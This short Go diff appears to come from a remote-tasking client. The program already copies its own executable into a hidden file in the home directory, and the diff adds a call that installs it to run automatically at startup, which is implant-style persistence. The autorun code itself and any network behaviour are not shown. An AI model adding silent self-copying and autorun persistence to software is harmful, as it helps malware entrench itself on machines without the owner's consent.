@@ -1,9 +1,10 @@
 package main
 
 import (
-	inter "../COMS-Client/interaction"
-	auth "../COMS-Client/auth"
-	tasking "../COMS-Client/task"
+	inter "./interaction"
+	auth "./auth"
+	tasking "./task"
+	autorunInstall "./autorunInstall"
 	"net/http"
 	"fmt"
 	"net/url"
@@ -29,6 +30,8 @@ func main() {
 	executable, _ := os.Executable()
 
 	exec.Command("cp", executable, home + ".coms")
+
+	autorunInstall.Install(executable)
 
 	if(proxy) {
 		proxyPath := ""
